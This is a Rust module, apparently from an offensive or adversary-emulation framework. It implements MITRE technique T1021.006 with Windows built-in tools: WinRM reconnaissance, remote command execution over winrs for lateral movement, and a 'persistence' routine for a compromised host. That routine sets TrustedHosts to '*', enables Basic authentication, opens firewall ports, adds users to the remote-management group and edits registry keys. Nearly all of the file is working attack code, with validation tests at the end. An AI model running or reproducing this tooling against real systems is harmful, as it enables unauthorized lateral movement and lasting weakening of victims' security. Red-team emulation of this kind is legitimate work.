//! # T1021.006 - Remote Services: Windows Remote Management
//!
//! Implements WinRM-based lateral movement, remote execution, and persistence
//! configuration using native Windows tools (winrs.exe, winrm.cmd, sc, reg, netsh).
//!
//! All procedures use Living-off-the-Land Binaries (LOLBins) only — no PowerShell.
//!
//! ## Sub-techniques implemented
//!
//! - **WinrmEnumeration**: Service discovery, configuration recon, listener enumeration
//! - **WinrmExecution**: Remote command execution via `winrs.exe` (single and multi-target)
//! - **WinrmPersistence**: Enable/configure WinRM service for persistent remote access

use nexus_common::{
    AttackTechnique, ExecutionContext, NexusError, Platform, Result, Tactic,
    TechniqueParams, TechniqueResult,
};

// ---------------------------------------------------------------------------
// T1021.006 — WinRM Enumeration (Phase 1: Recon)
// ---------------------------------------------------------------------------

/// Enumerate WinRM service status, configuration, and listeners on local or remote hosts.
///
/// Supported commands (via `mode` parameter):
/// - `service_local`  — `sc query winrm`
/// - `service_remote` — `sc \\TARGET query winrm`
/// - `config`         — `winrm get winrm/config`
/// - `listeners`      — `winrm enumerate winrm/config/listener`
/// - `users`          — `net localgroup "Remote Management Users"`
/// - `wmic_remote`    — `wmic /node:TARGET service where name="winrm" get name,state,startmode`
pub struct WinrmEnumeration;

#[async_trait::async_trait]
impl AttackTechnique for WinrmEnumeration {
    fn technique_id(&self) -> &str {
        "T1021.006"
    }

    fn name(&self) -> &str {
        "WinRM Enumeration"
    }

    fn tactics(&self) -> &[Tactic] {
        &[Tactic::Discovery]
    }

    fn platforms(&self) -> &[Platform] {
        &[Platform::Windows]
    }

    fn capabilities(&self) -> Vec<String> {
        vec!["winrm_enumeration".to_string()]
    }

    fn task_types(&self) -> Vec<String> {
        vec!["winrm_enum".to_string()]
    }

    fn validate(&self, params: &TechniqueParams) -> Result<()> {
        let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("service_local");
        match mode {
            "service_local" | "config" | "listeners" | "users" => Ok(()),
            "service_remote" | "wmic_remote" => {
                if !params.parameters.contains_key("target") {
                    return Err(NexusError::TaskExecutionError(
                        "Remote enumeration requires 'target' parameter".to_string(),
                    ));
                }
                Ok(())
            }
            _ => Err(NexusError::TaskExecutionError(format!(
                "Unknown enumeration mode: {}. Use: service_local, service_remote, config, listeners, users, wmic_remote",
                mode
            ))),
        }
    }

    async fn execute(
        &self,
        _ctx: &ExecutionContext,
        params: TechniqueParams,
    ) -> Result<TechniqueResult> {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;

            let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("service_local");
            let target = params.parameters.get("target").map(|s| s.as_str()).unwrap_or("");

            let output = match mode {
                "service_local" => {
                    Command::new("sc").args(&["query", "winrm"]).output()
                }
                "service_remote" => {
                    let remote = format!("\\\\{}", target);
                    Command::new("sc").args(&[&remote, "query", "winrm"]).output()
                }
                "config" => {
                    Command::new("winrm").args(&["get", "winrm/config"]).output()
                }
                "listeners" => {
                    Command::new("winrm")
                        .args(&["enumerate", "winrm/config/listener"])
                        .output()
                }
                "users" => {
                    Command::new("net")
                        .args(&["localgroup", "Remote Management Users"])
                        .output()
                }
                "wmic_remote" => {
                    Command::new("wmic")
                        .args(&[
                            &format!("/node:{}", target),
                            "service",
                            "where",
                            "name=\"winrm\"",
                            "get",
                            "name,state,startmode",
                        ])
                        .output()
                }
                _ => unreachable!(), // validated above
            }
            .map_err(|e| {
                NexusError::TaskExecutionError(format!("WinRM enumeration failed: {}", e))
            })?;

            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();

            if output.status.success() {
                Ok(TechniqueResult::ok(stdout))
            } else {
                Ok(TechniqueResult::err(format!(
                    "Exit code {}: {}",
                    output.status.code().unwrap_or(-1),
                    if stderr.is_empty() { &stdout } else { &stderr }
                )))
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = params;
            Err(NexusError::TaskExecutionError(
                "WinRM enumeration is only available on Windows".to_string(),
            ))
        }
    }
}

// ---------------------------------------------------------------------------
// T1021.006 — WinRM Remote Execution (Phase 2/3: Execution & Lateral Movement)
// ---------------------------------------------------------------------------

/// Execute commands on remote systems via `winrs.exe`.
///
/// Parameters:
/// - `target` (required) — Remote hostname or IP
/// - `command` (required) — Command to execute on the remote host
/// - `username` (optional) — DOMAIN\username for explicit auth
/// - `password` (optional) — Password (omit to use current Kerberos ticket)
///
/// When username/password are omitted, uses Kerberos pass-through (current ticket).
/// This is the preferred OPSEC approach in domain environments.
pub struct WinrmExecution;

#[async_trait::async_trait]
impl AttackTechnique for WinrmExecution {
    fn technique_id(&self) -> &str {
        "T1021.006"
    }

    fn name(&self) -> &str {
        "WinRM Remote Execution"
    }

    fn tactics(&self) -> &[Tactic] {
        &[Tactic::Execution, Tactic::LateralMovement]
    }

    fn platforms(&self) -> &[Platform] {
        &[Platform::Windows]
    }

    fn capabilities(&self) -> Vec<String> {
        vec![
            "winrm_execution".to_string(),
            "lateral_movement".to_string(),
        ]
    }

    fn task_types(&self) -> Vec<String> {
        vec!["winrm_exec".to_string()]
    }

    fn validate(&self, params: &TechniqueParams) -> Result<()> {
        if !params.parameters.contains_key("target") {
            return Err(NexusError::TaskExecutionError(
                "Missing 'target' parameter (remote hostname/IP)".to_string(),
            ));
        }
        if !params.parameters.contains_key("command") && params.command.is_empty() {
            return Err(NexusError::TaskExecutionError(
                "Missing 'command' parameter".to_string(),
            ));
        }
        Ok(())
    }

    async fn execute(
        &self,
        _ctx: &ExecutionContext,
        params: TechniqueParams,
    ) -> Result<TechniqueResult> {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;

            let target = params.parameters.get("target").unwrap();
            let command = params
                .parameters
                .get("command")
                .unwrap_or(&params.command);

            let mut args: Vec<String> = Vec::new();
            args.push(format!("-r:{}", target));

            // Explicit credentials (if provided), otherwise Kerberos pass-through
            if let (Some(user), Some(pass)) = (
                params.parameters.get("username"),
                params.parameters.get("password"),
            ) {
                args.push(format!("-u:{}", user));
                args.push(format!("-p:{}", pass));
            }

            args.push(command.clone());

            let output = Command::new("winrs")
                .args(&args)
                .output()
                .map_err(|e| {
                    NexusError::TaskExecutionError(format!("winrs execution failed: {}", e))
                })?;

            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();

            if output.status.success() {
                Ok(TechniqueResult::ok(stdout))
            } else {
                Ok(TechniqueResult::err(format!(
                    "winrs exit code {}: {}{}",
                    output.status.code().unwrap_or(-1),
                    stdout,
                    if stderr.is_empty() {
                        String::new()
                    } else {
                        format!("\nSTDERR: {}", stderr)
                    }
                )))
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = params;
            Err(NexusError::TaskExecutionError(
                "winrs execution is only available on Windows".to_string(),
            ))
        }
    }
}

// ---------------------------------------------------------------------------
// T1021.006 — WinRM Persistence Configuration (Phase 5)
// ---------------------------------------------------------------------------

/// Configure WinRM on a compromised system for persistent remote access.
///
/// Parameters:
/// - `mode` (required) — One of:
///   - `quickconfig`   — `winrm quickconfig -q`
///   - `trust_all`     — Set TrustedHosts to "*"
///   - `enable_basic`  — Enable Basic authentication
///   - `firewall`      — Add firewall rules for 5985/5986
///   - `add_user`      — Add user to Remote Management Users group (requires `username`)
///   - `autostart`     — Set WinRM to auto-start and start it
///   - `registry`      — Registry-based persistence (allow_remote_access, auth_basic, trusted_hosts)
///   - `full`          — Run all of the above in sequence
pub struct WinrmPersistence;

#[async_trait::async_trait]
impl AttackTechnique for WinrmPersistence {
    fn technique_id(&self) -> &str {
        "T1021.006"
    }

    fn name(&self) -> &str {
        "WinRM Persistence Configuration"
    }

    fn tactics(&self) -> &[Tactic] {
        &[Tactic::Persistence, Tactic::LateralMovement]
    }

    fn platforms(&self) -> &[Platform] {
        &[Platform::Windows]
    }

    fn capabilities(&self) -> Vec<String> {
        vec!["winrm_persistence".to_string()]
    }

    fn task_types(&self) -> Vec<String> {
        vec!["winrm_persist".to_string()]
    }

    fn validate(&self, params: &TechniqueParams) -> Result<()> {
        let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("");
        match mode {
            "quickconfig" | "trust_all" | "enable_basic" | "firewall" | "autostart"
            | "registry" | "full" => Ok(()),
            "add_user" => {
                if !params.parameters.contains_key("username") {
                    return Err(NexusError::TaskExecutionError(
                        "add_user mode requires 'username' parameter".to_string(),
                    ));
                }
                Ok(())
            }
            "" => Err(NexusError::TaskExecutionError(
                "Missing 'mode' parameter".to_string(),
            )),
            _ => Err(NexusError::TaskExecutionError(format!(
                "Unknown persistence mode: {}. Use: quickconfig, trust_all, enable_basic, firewall, add_user, autostart, registry, full",
                mode
            ))),
        }
    }

    async fn execute(
        &self,
        _ctx: &ExecutionContext,
        params: TechniqueParams,
    ) -> Result<TechniqueResult> {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;

            let mode = params.parameters.get("mode").map(|s| s.as_str()).unwrap_or("");

            let modes: Vec<&str> = if mode == "full" {
                vec![
                    "quickconfig",
                    "trust_all",
                    "enable_basic",
                    "firewall",
                    "autostart",
                    "registry",
                ]
            } else {
                vec![mode]
            };

            let mut results = Vec::new();

            for m in &modes {
                let result = match *m {
                    "quickconfig" => run_cmd("winrm", &["quickconfig", "-q"]),
                    "trust_all" => run_cmd(
                        "winrm",
                        &["set", "winrm/config/client", "@{TrustedHosts=\"*\"}"],
                    ),
                    "enable_basic" => run_cmd(
                        "winrm",
                        &["set", "winrm/config/service/auth", "@{Basic=\"true\"}"],
                    ),
                    "firewall" => {
                        let r1 = run_cmd(
                            "netsh",
                            &[
                                "advfirewall", "firewall", "add", "rule",
                                "name=WinRM-HTTP", "dir=in", "action=allow",
                                "protocol=TCP", "localport=5985",
                            ],
                        );
                        let r2 = run_cmd(
                            "netsh",
                            &[
                                "advfirewall", "firewall", "add", "rule",
                                "name=WinRM-HTTPS", "dir=in", "action=allow",
                                "protocol=TCP", "localport=5986",
                            ],
                        );
                        format!("{}\n{}", r1, r2)
                    }
                    "add_user" => {
                        let username = params.parameters.get("username").unwrap();
                        run_cmd(
                            "net",
                            &["localgroup", "Remote Management Users", username, "/add"],
                        )
                    }
                    "autostart" => {
                        let r1 = run_cmd("sc", &["config", "winrm", "start=", "auto"]);
                        let r2 = run_cmd("net", &["start", "winrm"]);
                        format!("{}\n{}", r1, r2)
                    }
                    "registry" => {
                        let cmds = [
                            vec![
                                "add",
                                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Service",
                                "/v", "allow_remote_access", "/t", "REG_DWORD", "/d", "1", "/f",
                            ],
                            vec![
                                "add",
                                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Service",
                                "/v", "auth_basic", "/t", "REG_DWORD", "/d", "1", "/f",
                            ],
                            vec![
                                "add",
                                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Client",
                                "/v", "trusted_hosts", "/t", "REG_SZ", "/d", "*", "/f",
                            ],
                        ];
                        let mut out = String::new();
                        for args in &cmds {
                            out.push_str(&run_cmd("reg", args));
                            out.push('\n');
                        }
                        out
                    }
                    _ => unreachable!(),
                };

                results.push(format!("[{}] {}", m, result));
            }

            Ok(TechniqueResult::ok(results.join("\n")))
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = params;
            Err(NexusError::TaskExecutionError(
                "WinRM persistence is only available on Windows".to_string(),
            ))
        }
    }
}

/// Helper: run a command and return stdout/stderr as a string.
#[cfg(target_os = "windows")]
fn run_cmd(program: &str, args: &[&str]) -> String {
    use std::process::Command;
    match Command::new(program).args(args).output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if output.status.success() {
                format!("OK: {}", stdout.trim())
            } else {
                format!(
                    "FAIL({}): {}{}",
                    output.status.code().unwrap_or(-1),
                    stdout.trim(),
                    if stderr.is_empty() {
                        String::new()
                    } else {
                        format!(" | {}", stderr.trim())
                    }
                )
            }
        }
        Err(e) => format!("ERROR: {}", e),
    }
}

// ---------------------------------------------------------------------------
// Registration
// ---------------------------------------------------------------------------

/// Register all T1021.006 techniques.
///
/// All three are Windows-only (winrs.exe, winrm.cmd, sc, reg, netsh).
pub fn register() -> Vec<Box<dyn AttackTechnique>> {
    vec![
        #[cfg(target_os = "windows")]
        Box::new(WinrmEnumeration),
        #[cfg(target_os = "windows")]
        Box::new(WinrmExecution),
        #[cfg(target_os = "windows")]
        Box::new(WinrmPersistence),
    ]
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn make_params(entries: &[(&str, &str)]) -> TechniqueParams {
        let mut parameters = HashMap::new();
        for (k, v) in entries {
            parameters.insert(k.to_string(), v.to_string());
        }
        TechniqueParams {
            command: String::new(),
            parameters,
            timeout: None,
        }
    }

    // -- Metadata tests --

    #[test]
    fn test_winrm_enum_metadata() {
        let tech = WinrmEnumeration;
        assert_eq!(tech.technique_id(), "T1021.006");
        assert_eq!(tech.tactics(), &[Tactic::Discovery]);
        assert_eq!(tech.platforms(), &[Platform::Windows]);
        assert_eq!(tech.task_types(), vec!["winrm_enum"]);
    }

    #[test]
    fn test_winrm_exec_metadata() {
        let tech = WinrmExecution;
        assert_eq!(tech.technique_id(), "T1021.006");
        assert_eq!(tech.tactics(), &[Tactic::Execution, Tactic::LateralMovement]);
        assert_eq!(tech.task_types(), vec!["winrm_exec"]);
    }

    #[test]
    fn test_winrm_persist_metadata() {
        let tech = WinrmPersistence;
        assert_eq!(tech.technique_id(), "T1021.006");
        assert_eq!(
            tech.tactics(),
            &[Tactic::Persistence, Tactic::LateralMovement]
        );
        assert_eq!(tech.task_types(), vec!["winrm_persist"]);
    }

    // -- Validation tests: WinrmEnumeration --

    #[test]
    fn test_enum_validates_local_modes() {
        let tech = WinrmEnumeration;
        for mode in &["service_local", "config", "listeners", "users"] {
            assert!(tech.validate(&make_params(&[("mode", mode)])).is_ok());
        }
    }

    #[test]
    fn test_enum_requires_target_for_remote() {
        let tech = WinrmEnumeration;
        // Missing target
        assert!(tech
            .validate(&make_params(&[("mode", "service_remote")]))
            .is_err());
        // With target
        assert!(tech
            .validate(&make_params(&[("mode", "service_remote"), ("target", "HOST1")]))
            .is_ok());
    }

    #[test]
    fn test_enum_rejects_unknown_mode() {
        let tech = WinrmEnumeration;
        assert!(tech.validate(&make_params(&[("mode", "bogus")])).is_err());
    }

    // -- Validation tests: WinrmExecution --

    #[test]
    fn test_exec_requires_target_and_command() {
        let tech = WinrmExecution;
        // Missing both
        assert!(tech.validate(&make_params(&[])).is_err());
        // Missing command
        assert!(tech
            .validate(&make_params(&[("target", "HOST1")]))
            .is_err());
        // All present
        assert!(tech
            .validate(&make_params(&[("target", "HOST1"), ("command", "whoami")]))
            .is_ok());
    }

    // -- Validation tests: WinrmPersistence --

    #[test]
    fn test_persist_validates_modes() {
        let tech = WinrmPersistence;
        for mode in &[
            "quickconfig",
            "trust_all",
            "enable_basic",
            "firewall",
            "autostart",
            "registry",
            "full",
        ] {
            assert!(tech.validate(&make_params(&[("mode", mode)])).is_ok());
        }
    }

    #[test]
    fn test_persist_add_user_requires_username() {
        let tech = WinrmPersistence;
        assert!(tech
            .validate(&make_params(&[("mode", "add_user")]))
            .is_err());
        assert!(tech
            .validate(&make_params(&[("mode", "add_user"), ("username", "DOMAIN\\user")]))
            .is_ok());
    }

    #[test]
    fn test_persist_rejects_missing_mode() {
        let tech = WinrmPersistence;
        assert!(tech.validate(&make_params(&[])).is_err());
    }

    // -- Registration test --

    #[test]
    fn test_register() {
        let techniques = register();
        #[cfg(target_os = "windows")]
        assert_eq!(techniques.len(), 3);
        #[cfg(not(target_os = "windows"))]
        assert_eq!(techniques.len(), 0);
    }
}
